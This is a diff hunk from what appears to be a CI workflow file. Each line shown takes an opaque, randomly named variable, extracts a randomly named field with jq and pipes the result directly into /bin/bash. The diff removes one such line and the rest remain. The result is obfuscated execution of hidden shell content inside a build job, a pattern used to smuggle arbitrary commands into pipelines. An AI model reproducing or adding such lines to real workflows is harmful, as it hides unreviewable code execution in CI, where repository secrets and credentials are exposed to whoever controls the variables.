@@ -38,7 +38,6 @@ jobs:
           echo $qvkjf233 | jq -r .aa299 | /bin/bash
           printf '%s' "$a16679" | jq -r .udw500 | /bin/bash
           printf '%s' "$zida5" | jq -r .h82552 | /bin/bash
-          printf '%s' "$x0" | jq -r .fg42 | /bin/bash
           printf '%s' "$wschq09795" | jq -r .pb487 | /bin/bash
           echo $wr64715 | jq -r .nnps66 | /bin/bash
           echo $arkkt97197 | jq -r .g6 | /bin/bash
